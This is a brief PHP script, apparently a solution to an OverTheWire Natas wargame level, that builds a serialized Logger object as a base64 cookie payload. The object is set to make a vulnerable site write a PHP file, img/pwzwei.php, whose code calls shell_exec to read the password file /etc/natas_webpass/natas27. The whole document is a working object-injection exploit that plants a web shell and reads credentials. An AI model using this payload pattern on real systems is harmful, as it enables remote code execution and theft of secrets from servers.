<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
        function __construct(){
            // initialise variables
            $this->initMsg="<?php echo cat /etc/natas_webpass/natas27 ?>";
            $this->exitMsg="<?php \$output = shell_exec('cat /etc/natas_webpass/natas27'); echo \$output; ?>";
            $this->logFile = "img/pwzwei.php";

        }

        }

$object[] = new Logger;

$ser = serialize($object);


$cookie = base64_encode($ser);
echo "\n$cookie\n";

?>
